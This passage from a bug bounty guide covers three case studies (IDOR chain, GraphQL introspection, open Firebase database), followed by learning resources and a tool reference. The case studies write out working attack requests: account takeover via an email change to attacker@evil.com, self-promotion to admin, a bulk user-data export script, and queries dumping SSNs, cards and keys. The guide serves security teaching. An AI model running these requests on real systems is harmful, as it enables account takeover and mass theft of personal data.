4. Use environment variables, not committed secrets
5. Regular security audits
6. Automated checks in CI/CD pipeline
```

---

### Case Study #3: The $20,000 API IDOR Chain

```
Hunter: @rez0
Platform: HackerOne  
Target: [Redacted Social Media Platform]
Bounty: $20,000
Severity: Critical
Date: 2020

DISCOVERY PROCESS:
==================

Phase 1: API Discovery via JavaScript
--------------------------------------
Target: app.target.com
Found main application JS bundle

Tool: LinkFinder
Command: python3 linkfinder.py -i https://app.target.com/static/js/main.js -o cli

Discovered Endpoints:
/api/v1/user/profile
/api/v1/user/settings
/api/v1/user/friends
/api/v1/user/messages
/api/v2/internal/admin/users
/api/v2/internal/debug

Phase 2: Initial Testing
-------------------------
Test 1: Get Own Profile
Request:
GET /api/v1/user/profile?user_id=12345
Authorization: Bearer [my_token]

Response:
{
  "user_id": 12345,
  "username": "hunter_test",
  "email": "hunter@email.com",
  "phone": "+1234567890",
  "address": "123 Main St"
}

Test 2: IDOR Attempt
Request:
GET /api/v1/user/profile?user_id=12346
Authorization: Bearer [my_token]

Response:
{
  "user_id": 12346,
  "username": "victim_user",
  "email": "victim@email.com",
  "phone": "+0987654321",
  "address": "456 Oak Ave"
}

Finding #1: IDOR in Profile Endpoint
Can access any user's profile by changing user_id

Phase 3: Expanding the Attack
------------------------------
Test 3: Messages Endpoint
Request:
GET /api/v1/user/messages?user_id=12346
Authorization: Bearer [my_token]

Response:
{
  "messages": [
    {
      "id": 1001,
      "from": "user_789",
      "to": "12346",
      "content": "Hey, here's my credit card: 4532-1234-5678-9012",
      "timestamp": "2020-03-15T10:30:00Z"
    },
    {
      "id": 1002,
      "from": "12346",
      "to": "user_789",
      "content": "Thanks! My SSN is 123-45-6789",
      "timestamp": "2020-03-15T10:32:00Z"
    }
  ]
}

Finding #2: IDOR in Messages
Can read any user's private messages

Test 4: Testing Write Operations
Request:
POST /api/v1/user/settings
Authorization: Bearer [my_token]
Content-Type: application/json

{
  "user_id": 12346,
  "email": "attacker@evil.com"
}

Response:
{
  "success": true,
  "message": "Email updated successfully"
}

Verification:
- Password reset sent to attacker@evil.com
- Account takeover possible!

Finding #3: IDOR in Settings Update
Can modify any user's account settings

Phase 4: Privilege Escalation
------------------------------
Remember: /api/v2/internal/admin/users found in JS

Test 5: Admin Endpoint
Request:
GET /api/v2/internal/admin/users?user_id=12346
Authorization: Bearer [my_token]

Response:
{
  "user_id": 12346,
  "username": "victim_user",
  "email": "victim@email.com",
  "role": "user",
  "is_verified": true,
  "payment_methods": [
    {
      "type": "credit_card",
      "last4": "9012",
      "exp_date": "12/24"
    }
  ],
  "subscriptions": [
    {
      "plan": "premium",
      "status": "active",
      "price": "$9.99/month"
    }
  ],
  "admin_notes": "VIP customer - handle with care"
}

Finding #4: Internal Admin API Accessible
Even more sensitive data exposed

Test 6: Can We Modify Admin Data?
Request:
POST /api/v2/internal/admin/users
Authorization: Bearer [my_token]
Content-Type: application/json

{
  "user_id": 12345,
  "role": "admin"
}

Response:
{
  "success": true,
  "message": "User role updated to admin"
}

Verification:
- My account now has admin role
- Can access all admin features
- Can modify any user data
- Can delete accounts
- Can view financial data

Finding #5: Privilege Escalation to Admin
Complete platform compromise

Phase 5: Automation & Impact Assessment
----------------------------------------
Created script to demonstrate impact:

#!/usr/bin/env python3
import requests

API_BASE = "https://app.target.com"
TOKEN = "my_bearer_token"

headers = {
    "Authorization": f"Bearer {TOKEN}",
    "Content-Type": "application/json"
}

# Export all user data
for user_id in range(1, 100000):
    try:
        # Get profile
        r = requests.get(
            f"{API_BASE}/api/v1/user/profile?user_id={user_id}",
            headers=headers
        )
        
        if r.status_code == 200:
            user_data = r.json()
            
            # Get messages
            messages = requests.get(
                f"{API_BASE}/api/v1/user/messages?user_id={user_id}",
                headers=headers
            ).json()
            
            # Get admin details
            admin_data = requests.get(
                f"{API_BASE}/api/v2/internal/admin/users?user_id={user_id}",
                headers=headers
            ).json()
            
            # Save to database
            save_user_data(user_data, messages, admin_data)
            
    except Exception as e:
        continue

Impact:
- Could export ALL user data
- 10 million+ users affected
- PII exposure (emails, phones, addresses)
- Private messages (including financial info)
- Payment information
- Admin notes and internal data

Phase 6: The Report
-------------------
Title: Critical IDOR Chain Leading to Full Platform Compromise

Severity: Critical
CWE: CWE-639 (Authorization Bypass Through User-Controlled Key)

Summary:
Multiple API endpoints lack proper authorization checks, allowing
any authenticated user to:
1. Access other users' profiles and private data
2. Read private messages
3. Modify account settings (leading to account takeover)
4. Access internal admin APIs
5. Escalate privileges to admin role

Affected Endpoints:
1. /api/v1/user/profile (Read IDOR)
2. /api/v1/user/messages (Read IDOR)
3. /api/v1/user/settings (Write IDOR)
4. /api/v2/internal/admin/users (Read IDOR + Auth Bypass)
5. /api/v2/internal/admin/users (Write IDOR + Privilege Escalation)

Reproduction Steps:

Step 1: Access Other User's Profile
------------------------------------
1. Login to your account
2. Capture your JWT token from browser (DevTools)
3. Make request:
   curl -H "Authorization: Bearer YOUR_TOKEN" \
        "https://app.target.com/api/v1/user/profile?user_id=VICTIM_ID"
4. Observe: You can see victim's full profile

Step 2: Read Private Messages
------------------------------
1. Using same token:
   curl -H "Authorization: Bearer YOUR_TOKEN" \
        "https://app.target.com/api/v1/user/messages?user_id=VICTIM_ID"
2. Observe: All victim's private messages visible

Step 3: Account Takeover
-------------------------
1. POST request to change email:
   curl -X POST \
        -H "Authorization: Bearer YOUR_TOKEN" \
        -H "Content-Type: application/json" \
        -d '{"user_id":VICTIM_ID,"email":"attacker@evil.com"}' \
        "https://app.target.com/api/v1/user/settings"
2. Click "Forgot Password" on login page
3. Enter victim's username
4. Reset link sent to attacker@evil.com
5. Complete password reset
6. Victim's account is now under attacker's control

Step 4: Privilege Escalation
-----------------------------
1. POST request:
   curl -X POST \
        -H "Authorization: Bearer YOUR_TOKEN" \
        -H "Content-Type: application/json" \
        -d '{"user_id":YOUR_ID,"role":"admin"}' \
        "https://app.target.com/api/v2/internal/admin/users"
2. Refresh page
3. Admin panel now accessible
4. Full admin privileges granted

Impact:
-------
- Mass PII exposure (10M+ users)
- Private communication disclosure
- Account takeover at scale
- Financial data exposure
- Complete platform compromise
- Regulatory violations (GDPR, CCPA)

Remediation:
------------
1. Implement proper authorization checks:
   - Verify user can only access their own data
   - Check user_id in JWT matches user_id in request
   - Implement role-based access control (RBAC)

2. Example fix (pseudocode):
   
   def get_user_profile(request):
       requested_user_id = request.params['user_id']
       current_user_id = decode_jwt(request.headers['Authorization'])
       
       # Authorization check
       if requested_user_id != current_user_id:
           if not current_user.is_admin:
               return {"error": "Unauthorized"}, 403
       
       return get_profile(requested_user_id)

3. Remove internal admin APIs from public access
4. Implement rate limiting
5. Add audit logging
6. Security code review
7. Penetration testing before releases

Evidence:
---------
[Attached: Screenshots, video PoC, request/response logs]

Timeline:
---------
Day 0: Vulnerability discovered
Day 0: Reported to security team
Day 1: Triaged as Critical
Day 2: Emergency patch deployed
Day 3: All user sessions invalidated
Day 4: Security audit initiated
Day 7: Full fix implemented
Day 14: Bounty awarded: $20,000
Day 21: Public disclosure (coordinated)

LESSONS LEARNED:
================

1. ALWAYS test IDOR on APIs:
   - Change numeric IDs
   - Change UUIDs
   - Try other users' identifiers
   - Test both read and write operations

2. Test all HTTP methods:
   - GET (read)
   - POST (create)
   - PUT/PATCH (update)
   - DELETE (delete)

3. Look for API version differences:
   - /api/v1/ might have security
   - /api/v2/ might not
   - /internal/ endpoints often lack auth

4. Chain vulnerabilities:
   - Read IDOR → Account Takeover
   - Write IDOR → Privilege Escalation
   - Multiple IDORs → Mass data breach

5. Automation is key:
   - Script to test 100s of endpoints
   - Test all users IDs (within reason)
   - Demonstrate real impact

6. Tools:
   - Burp Suite Repeater
   - Postman
   - Custom Python scripts
   - Arjun (parameter discovery)

TESTING CHECKLIST:
==================
For every API endpoint found:

□ Identify user-specific parameters (user_id, id, uuid)
□ Change parameter to another user's value
□ Test with valid authentication token
□ Test without authentication token
□ Test with expired token
□ Test with another user's token
□ Try different HTTP methods
□ Add extra parameters (role=admin)
□ Remove required parameters
□ Use negative numbers
□ Use very large numbers
□ Use special characters
□ Test rate limiting
□ Document everything
```

---

### Case Study #4: The $15,000 GraphQL Introspection

```
Hunter: @samwcyo
Platform: Bugcrowd
Target: [Redacted Fintech]
Bounty: $15,000
Severity: High
Date: 2021

DISCOVERY:
==========

Phase 1: Finding GraphQL
-------------------------
During JavaScript analysis:

$ cat main.js | grep -i "graphql\|query\|mutation"

Found:
const GRAPHQL_ENDPOINT = "https://api.target.com/graphql";

const LOGIN_MUTATION = `
  mutation {
    login(email: $email, password: $password) {
      token
      user {
        id
        email
        role
      }
    }
  }
`;

Phase 2: Testing GraphQL Endpoint
----------------------------------
Test 1: Basic Query
curl -X POST https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{__typename}"}'

Response:
{
  "data": {
    "__typename": "Query"
  }
}

Confirmed: GraphQL endpoint active!

Test 2: Introspection Query
curl -X POST https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{__schema{types{name,fields{name,type{name,kind}}}}}"}'

Response:
{
  "data": {
    "__schema": {
      "types": [
        {
          "name": "Query",
          "fields": [
            {
              "name": "user",
              "type": {"name": "User", "kind": "OBJECT"}
            },
            {
              "name": "users",
              "type": {"name": "[User]", "kind": "LIST"}
            },
            {
              "name": "transaction",
              "type": {"name": "Transaction", "kind": "OBJECT"}
            },
            {
              "name": "transactions",
              "type": {"name": "[Transaction]", "kind": "LIST"}
            },
            {
              "name": "internalAdminPanel",
              "type": {"name": "AdminData", "kind": "OBJECT"}
            }
          ]
        },
        {
          "name": "User",
          "fields": [
            {"name": "id", "type": {"name": "Int"}},
            {"name": "email", "type": {"name": "String"}},
            {"name": "password", "type": {"name": "String"}},
            {"name": "ssn", "type": {"name": "String"}},
            {"name": "bankAccount", "type": {"name": "String"}},
            {"name": "creditCards", "type": {"name": "[CreditCard]"}}
          ]
        },
        {
          "name": "Transaction",
          "fields": [
            {"name": "id", "type": {"name": "Int"}},
            {"name": "amount", "type": {"name": "Float"}},
            {"name": "from_account", "type": {"name": "String"}},
            {"name": "to_account", "type": {"name": "String"}},
            {"name": "timestamp", "type": {"name": "String"}}
          ]
        }
      ]
    }
  }
}

Finding: Full schema disclosed!

Phase 3: Exploitation
----------------------
Test 3: Query User Data
{
  user(id: 12345) {
    id
    email
    password
    ssn
    bankAccount
    creditCards {
      number
      cvv
      expiry
    }
  }
}

Response:
{
  "data": {
    "user": {
      "id": 12345,
      "email": "victim@email.com",
      "password": "$2b$10$[HASH]",
      "ssn": "123-45-6789",
      "bankAccount": "1234567890",
      "creditCards": [
        {
          "number": "4532123456789012",
          "cvv": "123",
          "expiry": "12/25"
        }
      ]
    }
  }
}

CRITICAL: No authentication required!
Could access any user's financial data!

Test 4: Batch Query
{
  users(limit: 1000) {
    id
    email
    ssn
    bankAccount
  }
}

Response:
{
  "data": {
    "users": [
      {/* 1000 users with full PII */}
    ]
  }
}

Could export entire user database!

Test 5: Internal Admin Panel
{
  internalAdminPanel {
    totalUsers
    totalTransactions
    revenue
    databaseHost
    apiKeys {
      stripe
      plaid
      aws
    }
  }
}

Response:
{
  "data": {
    "internalAdminPanel": {
      "totalUsers": 1250000,
      "totalTransactions": 45000000,
      "revenue": "$125,000,000",
      "databaseHost": "prod-db-01.internal.target.com",
      "apiKeys": {
        "stripe": "sk_live_[REDACTED]",
        "plaid": "plaid_prod_[REDACTED]",
        "aws": "AKIA[REDACTED]"
      }
    }
  }
}

Complete system compromise!

Bounty: $15,000

LESSONS:
========
1. Always test GraphQL introspection
2. Look for sensitive fields in schema
3. Test queries without authentication
4. Try batch queries
5. Look for internal/admin types
6. Use graphql-voyager for visualization

Prevention:
- Disable introspection in production
- Implement authentication
- Field-level authorization
- Rate limiting
- Query complexity limits
```

---

### Case Study #5: The $12,000 Firebase Misconfiguration

```
Hunter: @ngalog  
Platform: HackerOne
Target: [Redacted Mobile App]
Bounty: $12,000
Severity: Critical
Date: 2020

DISCOVERY:
==========

Phase 1: JavaScript Analysis
-----------------------------
Mobile app → Extracted APK → Decompiled

Found in assets/js/config.js:

const firebaseConfig = {
  apiKey: "AIzaSyDOCAbC123dEf456GhI789jKl012-MnO3456",
  authDomain: "company-prod.firebaseapp.com",
  databaseURL: "https://company-prod.firebaseio.com",
  projectId: "company-prod",
  storageBucket: "company-prod.appspot.com",
  messagingSenderId: "123456789012",
  appId: "1:123456789012:web:abc123def456"
};

Phase 2: Testing Firebase Security
-----------------------------------
Test 1: Database Read Access

curl "https://company-prod.firebaseio.com/.json?auth=AIzaSyDOCAbC123dEf456GhI789jKl012-MnO3456"

Response:
{
  "users": {
    "user_001": {
      "name": "John Doe",
      "email": "john@example.com",
      "phone": "+1234567890",
      "address": "123 Main St",
      "ssn": "123-45-6789",
      "creditCard": {
        "number": "4532-xxxx-xxxx-1234",
        "cvv": "123"
      }
    },
    // ... 50,000 more users
  },
  "transactions": { /* financial data */ },
  "adminKeys": { /* API keys */ }
}

CRITICAL: Entire database publicly readable!

Test 2: Write Access
POST to database:
curl -X PUT \
  "https://company-prod.firebaseio.com/users/user_001.json" \
  -d '{"name": "HACKED"}'

Response: 200 OK

CRITICAL: Database publicly writable!

Impact:
- 50,000+ user records exposed
- PII, financial data leaked
- Could modify/delete data
- Could lock out all users

Bounty: $12,000

LESSONS:
========
1. Always check Firebase security rules
2. Test both read and write access
3. Look for API keys in:
   - JavaScript files
   - Mobile apps (decompiled)
   - GitHub repos
4. Firebase keys are meant to be public
   BUT security rules must be configured!

Prevention:
{
  "rules": {
    ".read": "auth != null",
    ".write": "auth != null"
  }
}
```

---

## 📚 Learning Resources & Roadmap

### 🎓 Recommended Learning Path

```
MONTH 1-2: FOUNDATIONS
======================
Week 1-2: Web Fundamentals
- HTML, CSS, JavaScript basics
- HTTP protocol deep dive
- Browser DevTools mastery
- Understanding REST APIs

Resources:
→ MDN Web Docs (developer.mozilla.org)
→ "The Web Application Hacker's Handbook" (book)
→ PortSwigger Web Security Academy (free)

Week 3-4: Linux & Command Line
- Basic Linux commands
- Bash scripting
- File permissions
- Process management

Resources:
→ OverTheWire: Bandit (wargame)
→ Linux Journey (linuxjourney.com)
→ "The Linux Command Line" (book)

Week 5-6: Networking
- TCP/IP fundamentals
- DNS deep dive
- SSL/TLS certificates
- HTTP/HTTPS headers

Resources:
→ "Computer Networking: A Top-Down Approach" (book)
→ Cybrary networking courses (free)
→ Practical Packet Analysis (book)

Week 7-8: Bug Bounty Basics
- Understanding vulnerabilities
- Reading bug reports (Hacktivity on HackerOne)
- Report writing
- Responsible disclosure

Resources:
→ HackerOne Hacktivity (public reports)
→ Bug Bounty Bootcamp (book by Vickie Li)
→ Nahamsec's Twitch streams
→ STÖK YouTube channel

MONTH 3-4: RECONNAISSANCE MASTERY
==================================
Week 1-2: Passive Recon
- Subdomain enumeration
- OSINT techniques
- Certificate transparency
- Wayback Machine

Practical:
→ Practice on bug bounty programs
→ Build automation scripts
→ Create custom wordlists
→ Set up monitoring

Week 3-4: Active Recon (THIS GUIDE!)
- Host discovery
- Port scanning
- Content discovery
- Technology fingerprinting

Practical:
→ Run through every phase in this guide
→ Practice on DVWA, Juice Shop
→ Document everything
→ Build your methodology

Week 5-6: Automation
- Bash scripting
- Python for security
- Tool integration
- Workflow optimization

Projects:
→ Build custom recon framework
→ Automate report generation
→ Create notification system
→ CI/CD for recon

Week 7-8: Practice
- Practice on Hack The Box
- TryHackMe paths
- Real bug bounty programs (start slow)
- Document learnings

MONTH 5-6: VULNERABILITY HUNTING
=================================
Week 1-2: Common Vulnerabilities
- OWASP Top 10
- XSS (Reflected, Stored, DOM)
- SQL Injection
- CSRF

Resources:
→ PortSwigger Academy (best resource)
→ PentesterLab (paid but worth it)
→ Web Security Academy

Week 3-4: Advanced Vulnerabilities
- IDOR
- Business logic flaws
- Race conditions
- Authentication bypasses

Practice:
→ HackTheBox retired machines
→ Bug bounty programs
→ CTF competitions

Week 5-6: API Security
- REST API testing
- GraphQL exploitation
- JWT vulnerabilities
- OAuth misconfigurations

Resources:
→ "Hacking APIs" (book)
→ APIsecurity.io
→ OWASP API Security Top 10

Week 7-8: Real Hunting
- Join bug bounty programs
- Set up recon automation
- Submit first reports
- Learn from duplicates

MONTH 7+: CONTINUOUS IMPROVEMENT
=================================
- Read writeups daily
- Practice consistently
- Network with hunters
- Share knowledge
- Specialize in area of interest
- Stay updated on new techniques
```

### 📖 Essential Books

```
1. "Bug Bounty Bootcamp" by Vickie Li
   → Best for beginners
   → Practical approach
   → Real-world examples

2. "Real-World Bug Hunting" by Peter Yaworski
   → Case studies
   → Methodology insights
   → Hunter perspectives

3. "The Web Application Hacker's Handbook" by Stuttard & Pinto
   → Technical deep dive
   → Comprehensive coverage
   → Industry standard

4. "Hacking APIs" by Corey J. Ball
   → API security focused
   → Modern techniques
   → Practical examples

5. "Black Hat Go" by Tom Steele
   → Security tool development
   → Automation
   → Advanced techniques

6. "The Tangled Web" by Michal Zalewski
   → Browser security
   → Deep technical knowledge
   → Advanced concepts
```

### 🎥 YouTube Channels

```
Must Follow:

1. Nahamsec
   → Recon techniques
   → Live bug hunting
   → Tool demonstrations
   → Weekly videos

2. STÖK
   → Methodology
   → Mindset
   → Collaboration videos
   → Bug bounty tips

3. InsiderPhD
   → Beginner-friendly
   → Detailed explanations
   → Vulnerability tutorials
   → Report breakdowns

4. PwnFunction
   → Animated explanations
   → Vulnerability deep dives
   → Creative presentation
   → Technical accuracy

5. LiveOverflow
   → CTF solutions
   → Binary exploitation
   → Advanced techniques
   → Educational content

6. HackerSploit
   → Practical tutorials
   → Tool usage
   → Kali Linux
   → Penetration testing

7. John Hammond
   → CTF walkthroughs
   → Malware analysis
   → Programming
   → General security

8. IppSec
   → HackTheBox walkthroughs
   → Detailed methodology
   → Tool mastery
   → Real techniques
```

### 🌐 Essential Websites

```
Bug Bounty Platforms:
1. HackerOne (hackerone.com)
   - Largest platform
   - Beginner-friendly
   - Great documentation

2. Bugcrowd (bugcrowd.com)
   - Quality programs
   - Good payouts
   - Active community

3. Intigriti (intigriti.com)
   - European focus
   - Fair rules
   - Researcher-friendly

4. YesWeHack (yeswehack.com)
   - Growing platform
   - Good programs
   - Fair policies

5. Synack (synack.com)
   - Invite-only
   - High quality
   - Good compensation

Learning Platforms:
1. PortSwigger Web Security Academy
   → Free
   → Best web security training
   → Interactive labs
   → Certificates

2. PentesterLab (pentesterlab.com)
   → Practical exercises
   → Real vulnerabilities
   → $20/month (worth it)

3. TryHackMe (tryhackme.com)
   → Beginner-friendly
   → Guided paths
   → Browser-based labs
   → Free + paid tiers

4. HackTheBox (hackthebox.com)
   → Real machines
   → Active community
   → CTF challenges
   → Skill development

5. Cybrary (cybrary.it)
   → Free courses
   → Structured learning
   → Certifications
   → Career paths

Practice Targets:
1. DVWA (Damn Vulnerable Web App)
   → docker run -p 80:80 vulnerables/web-dvwa

2. OWASP Juice Shop
   → docker run -p 3000:3000 bkimminich/juice-shop

3. bWAPP
   → Comprehensive vulnerabilities
   → Good for practice

4. WebGoat
   → OWASP project
   → Educational
   → Step-by-step

5. Mutillidae
   → OWASP project
   → Extensive coverage
```

### 🐦 Twitter Accounts to Follow

```
Top Bug Bounty Hunters:
@NahamSec - Ben Sadeghipour
@stokfredrik - Fredrik Alexandersson
@zseano - Sean Melia
@EdOverflow - Ed Foudil
@samwcyo - Sam Curry
@ngalongc - Ron Chan
@fransrosen - Frans Rosén
@jobertabma - Jobert Abma
@yaworsk - Peter Yaworski
@ITSecurityguard - Shubs
@hunter0x7 - Harsh Bothra
@TomNomNom - Tom Hudson
@jhaddix - Jason Haddix
@Bugcrowd - Platform updates
@Hacker0x01 - HackerOne updates

Security Researchers:
@LiveOverflow - Technical content
@PwnFunction - Educational
@InsiderPhD - Beginner-friendly
@hakluke - Tool development
@tomnomnom - Amazing tools
@pdiscoveryio - ProjectDiscovery team

Hashtags to Follow:
#bugbounty
#bugbountytip
#infosec
#websecurity
#ethicalhacking
```

### 🛠️ Essential Tools Reference

```bash
# RECONNAISSANCE TOOLS
# ====================

# Subdomain Enumeration:
subfinder -d target.com
amass enum -d target.com
assetfinder target.com
findomain -t target.com

# DNS Tools:
dnsx -l subdomains.txt -resp
massdns -r resolvers.txt -t A subdomains.txt

# HTTP Probing:
httpx -l subdomains.txt -title -tech-detect -status-code
httprobe < subdomains.txt

# URL Collection:
waybackurls target.com
gau target.com
hakrawler -url https://target.com

# JavaScript:
getJS --url https://target.com
subjs -i subdomains.txt

# PORT SCANNING
# =============
naabu -host target.com -top-ports 1000
masscan -p1-65535 target.com --rate 1000
nmap -sV -p- target.com

# CONTENT DISCOVERY
# =================
ffuf -w wordlist.txt -u https://target.com/FUZZ
dirsearch -u https://target.com
feroxbuster -u https://target.com
gobuster dir -u https://target.com -w wordlist.txt

# TECHNOLOGY DETECTION
# ====================
whatweb https://target.com
wappalyzer https://target.com (browser extension)
webanalyze -host https://target.com

# VULNERABILITY SCANNING
# ======================
nuclei -l urls.txt -t nuclei-templates/
nikto -h https://target.com
wpscan --url https://target.com

# SCREENSHOTS
# ===========
gowitness file -f urls.txt
eyewitness -f urls.txt --web
aquatone < urls.txt

# API TESTING
# ===========
arjun -u https://api.target.com/endpoint
kiterunner scan https://api.target.com -w routes.kite
postman (GUI tool)

# JAVASCRIPT ANALYSIS
# ===================
linkfinder.py -i https://target.com/app.js
secretfinder.py -i https://target.com/app.js
js-beautify app.min.js > app.js

# PROXY & INTERCEPTION
# ====================
Burp Suite (industry standard)
OWASP ZAP (free alternative)
mitmproxy (command line)

# HELPER TOOLS
# ============
unfurl (URL parsing)
anew (add new lines only)
gf (grep patterns)
jq (JSON parsing)
puredns (DNS validation)
shuffledns (DNS bruteforce)

# CLOUD TOOLS
# ===========
s3scanner (AWS S3)
cloud_enum (Multi-cloud)
aws cli (AWS operations)

# NETWORK
# =======
hakrevdns (Reverse DNS)
dnsx (DNS toolkit)
amass intel (ASN enumeration)

# AUTOMATION
# ==========
interlace (command threading)
parallel (GNU parallel)
rush (modern parallel)
```

### 💡 Pro Tips from Top Hunters

```
From @NahamSec:
===============
"Recon is where you make your money. Spend 80% of your time 
mapping the attack surface. The vulnerabilities will reveal 
themselves once you truly understand the target."

Key Advice:
- Build custom recon workflows
- Automate everything possible
- Monitor targets continuously  
- Quality over quantity
- Document your methodology

From @zseano:
=============
"Don't just run tools. Understand what they're doing and why.
Then customize them for your needs. The best bugs come from
techniques others aren't using."

Key Advice:
- Learn how tools work internally
- Modify tools for specific scenarios
- Create custom wordlists
- Think like a developer
- Chain vulnerabilities

From @stokfredrik:
==================
"Collaboration and community are key. Share your knowledge,
learn from others, and remember that we're all here to make
the internet safer."

Key Advice:
- Join Discord communities
- Share tips on Twitter
- Help beginners
- Collaborate on hard targets
- Give back to community

From @samwcyo:
=============
"The best hunters aren't necessarily the most technical.
They're the most persistent, creative, and methodical.
Develop your process and stick to it."

Key Advice:
- Create checklists
- Test everything systematically
- Don't skip "boring" targets
- Persistence pays off
- Learn from failures

From @EdOverflow:
=================
"Read the program rules carefully. One violation can get you
banned from a platform forever. Respect the scope, respect
the rules, and always communicate with the program."

Key Advice:
- Read rules 3 times minimum
- Ask if unsure
- Document everything
- Professional communication
- Build your reputation

From @fransrosen:
================
"The difference between a good report and a great report
is impact demonstration. Don't just report the vulnerability,
show what an attacker could actually do with it."

Key Advice:
- Write clear reproduction steps
- Include video PoCs
- Explain business impact
- Suggest remediation
- Professional presentation
```

### 🎯 Your First 30 Days Action Plan

```
WEEK 1: SETUP & FOUNDATIONS
===========================
Day 1-2: Environment Setup
□ Install Kali Linux (VM or WSL2)
□ Install all tools from this guide
□ Verify installations
□ Create directory structure
□ Set up note-taking system (Obsidian/Notion)

Day 3-4: Tool Familiarization
□ Run each tool on test targets
□ Read documentation
□ Watch tutorial videos
□ Practice basic commands
□ Create personal cheat sheets

Day 5-7: Pick First Program
□ Browse HackerOne public programs
□ Find beginner-friendly program
□ Read scope carefully
□ Read past reports (Hacktivity)
□ Understand what's already been found

WEEK 2: PASSIVE RECON
=====================
Day 8-10: Information Gathering
□ Subdomain enumeration (all methods)
□ Historical data collection
□ OSINT on target
□ Technology identification
□ Map company infrastructure

Day 11-14: Documentation
□ Organize all findings
□ Create target knowledge base
□ Identify interesting patterns
□ Prioritize targets
□ Plan active testing

WEEK 3: ACTIVE RECON
====================
Day 15-17: Host Discovery
□ Validate all subdomains
□ Categorize by status code
□ Identify high-value targets
□ Port scanning (conservative)
□ Technology fingerprinting

Day 18-21: Deep Enumeration
□ Content discovery (selective)
□ JavaScript analysis
□ API enumeration
□ Screenshot all hosts
□ Visual analysis

WEEK 4: TESTING & REPORTING
===========================
Day 22-25: Vulnerability Hunting
□ Test interesting findings
□ Focus on one vuln type
□ Manual validation
□ Impact assessment
□ Document everything

Day 26-28: First Report
□ Write clear reproduction steps
□ Create video PoC if possible
□ Explain impact
□ Suggest remediation
□ Submit report

Day 29-30: Learning & Iteration
□ Review feedback
□ Learn from mistakes
□ Read other reports
□ Improve methodology
□ Plan next steps

POST-30 DAYS: CONTINUOUS IMPROVEMENT
====================================
Weekly Goals:
□ Test at least 3 targets
□ Submit at least 1 report
□ Learn 1 new technique
□ Read 5 disclosed reports
□ Improve your tools/scripts

Monthly Goals:
□ Get first bounty (even if small)
□ Build comprehensive methodology
□ Automate recon completely
□ Contribute to community
□ Track progress & improvements
```

### ⚠️ Common Mistakes to Avoid

```
CRITICAL MISTAKES:
==================

1. Testing Out of Scope
   ❌ "I found admin.outofscope.target.com"
   → Instant ban from program
   → Possible legal issues
   → Reputation damage
   
   ✅ Always verify scope
   ✅ When in doubt, ask first
   ✅ Save out-of-scope findings for later

2. Aggressive Scanning
   ❌ ffuf -rate 10000 -t 500
   → WAF blocking
   → Service disruption
   → Program complaint
   
   ✅ Use rate limiting
   ✅ Reasonable thread counts
   ✅ Monitor for issues

3. Not Reading Rules
   ❌ "I didn't know DoS testing was prohibited"
   → Report rejected
   → Account warning
   → Lost bounty
   
   ✅ Read policy fully
   ✅ Note restrictions
   ✅ Follow guidelines

4. Poor Report Quality
   ❌ "I found XSS, give me money"
   → Report closed
   → Negative reputation
   → No payment
   
   ✅ Clear reproduction
   ✅ Impact explanation
   ✅ Professional tone

5. Testing Production
   ❌ Uploading shells to prod
   → Immediate ban
   → Legal liability
   → Industry blacklist
   
   ✅ Test safely
   ✅ Minimize impact
   ✅ Never cause damage

BEGINNER MISTAKES:
==================

1. Scanning Everything
   → Wastes time
   → Low success rate
   → Noisy behavior
   
   Fix: Focus on interesting targets

2. Using Only Tools
   → Missing creative bugs
   → Too much competition
   → Low payouts
   
   Fix: Manual testing is key

3. Giving Up Too Early
   → No bugs in first week
   → Think it's impossible
   → Quit program
   
   Fix: Persistence wins

4. Not Documenting
   → Forget what you found
   → Can't reproduce bugs
   → Lost work
   
   Fix: Note everything

5. Hunting Alone
   → Miss learning opportunities
   → No feedback
   → Slower progress
   
   Fix: Join community

6. Chasing Duplicates
   → Same bugs everyone finds
   → Low-hanging fruit only
   → Frustration
   
   Fix: Deep recon finds unique bugs

7. Ignoring Basics
   → Skip fundamentals
   → Jump to advanced
   → Weak foundation
   
   Fix: Master basics first

8. Bad Time Management
   → Spend 10 hours on one target
   → No organization
   → Inefficient
   
   Fix: Set time limits

TECHNICAL MISTAKES:
===================

1. False Positives
   → Report bugs that don't exist
   → Damage credibility
   → Waste time
   
   Fix: Always verify manually

2. Incomplete Testing
   → Test GET, ignore POST
   → Test one endpoint
   → Miss full impact
   
   Fix: Comprehensive testing

3. Not Chaining
   → Report low-impact bugs alone
   → Miss critical chains
   → Lower payouts
   
   Fix: Combine vulnerabilities

4. Ignoring Context
   → Report issues on test environment
   → No real impact
   → Informative severity
   
   Fix: Understand business impact

5. Over-reliance on Automation
   → Just run Nuclei
   → No manual verification
   → Generic findings
   
   Fix: Automation + Manual

MINDSET MISTAKES:
=================

1. Entitlement
   → "I deserve more money"
   → Arguing with programs
   → Burning bridges
   
   Fix: Professional always

2. Comparison
   → "Others make $100k, I make nothing"
   → Demotivation
   → Giving up
   
   Fix: Your own pace

3. Shortcuts
   → Looking for "easy money"
   → Quick wins only
   → No depth
   
   Fix: Long-term thinking

4. Disclosure Timing
   → Publishing 0-days publicly
   → No coordination
   → Ethical issues
   
   Fix: Responsible disclosure

5. Greed
   → Report after report
   → Quality suffers
   → Reputation damage
   
   Fix: Quality > Quantity
```

---

## 🎓 Final Words: The Path to Mastery

### The Bug Bounty Mindset

```
Success in bug bounty is not about:
❌ Being the most technical
❌ Having the best tools
❌ Finding bugs the fastest
❌ Making money overnight

Success in bug bounty IS about:
✅ Persistence and consistency
✅ Continuous learning
✅ Creative problem-solving
✅ Professional conduct
✅ Community contribution
✅ Systematic methodology
✅ Patience and discipline

Remember:
---------
"Every expert was once a beginner.
 Every pro was once an amateur.
 Every master started with basics."

The hunters making $100k+/year:
- Started with $0
- Got duplicates for months
- Kept learning and improving
- Never gave up
- Built their methodology
- Shared their knowledge

You can too.
```

### Your Journey Ahead

```
MONTHS 1-3: The Struggle
========================
- Many duplicates
- Lots of "N/A" responses
- Feeling frustrated
- Questioning if it's worth it

This is NORMAL. Everyone goes through this.

What to do:
→ Keep learning
→ Improve methodology
→ Study disclosed reports
→ Practice on labs
→ Stay consistent

MONTHS 4-6: The Breakthrough
=============================
- First accepted reports
- First bounties ($50-$500)
- Understanding what works
- Building confidence
- Developing instinct

This is where it clicks.

What to do:
→ Double down on what works
→ Automate your workflow
→ Specialize in something
→ Build relationships
→ Help others

MONTHS 7-12: The Growth
=======================
- Regular bounties
- Higher severity findings
- Efficient workflow
- Recognition growing
- Network expanding

This is where you become profitable.

